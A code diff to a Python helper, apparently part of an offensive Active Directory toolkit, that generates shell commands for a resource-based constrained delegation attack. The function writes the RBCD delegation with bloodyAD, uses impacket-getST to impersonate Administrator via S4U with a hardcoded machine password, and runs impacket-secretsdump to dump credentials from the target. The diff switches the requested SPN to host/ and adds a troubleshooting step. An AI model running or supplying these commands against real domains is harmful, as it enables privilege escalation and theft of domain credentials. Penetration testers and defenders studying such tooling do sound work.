@@ -107,15 +107,20 @@ def rbcd_write(domain: str, dc: str, target: str, controlled_computer: str,
         f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
         f"add rbcd '{target}' '{controlled_computer}'",
         "",
-        "# 3. S4U: get a TGS as Administrator for cifs/<target> using the controlled computer.",
-        "#    The SPN must use the target's DNS hostname (no '$'), and we unset",
-        "#    KRB5CCNAME first so impacket doesn't load a stale ccache from a prior run.",
+        "# 3. S4U: get a TGS as Administrator using the controlled computer.",
+        "#    Default SPN is host/<target> — universally registered on every",
+        "#    domain-joined computer (cifs/ is also fine for real machines, but",
+        "#    addcomputer-created accounts only get host/* SPNs by default).",
+        "#    Unset KRB5CCNAME first so impacket doesn't load a stale ccache.",
         "unset KRB5CCNAME",
-        f"impacket-getST -spn 'cifs/{target_clean}.{domain}' "
+        f"impacket-getST -spn 'host/{target_clean}.{domain}' "
         f"-impersonate Administrator -dc-ip {dc} "
         f"'{domain}/{controlled_clean}$:Pwn3d!'",
+        "# If S_PRINCIPAL_UNKNOWN, list the target's SPNs and retry with one of them:",
+        f"#   bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
+        f"get object '{target}' --attr servicePrincipalName",
         "",
-        "# 4. Use the ticket. KRB5CCNAME is set inline so it doesn't leak to the next run.",
+        "# 4. Use the ticket (KRB5CCNAME inline so it doesn't leak to next command).",
         f"KRB5CCNAME=Administrator.ccache impacket-secretsdump "
         f"-k -no-pass '{target_clean}.{domain}'",
     ]
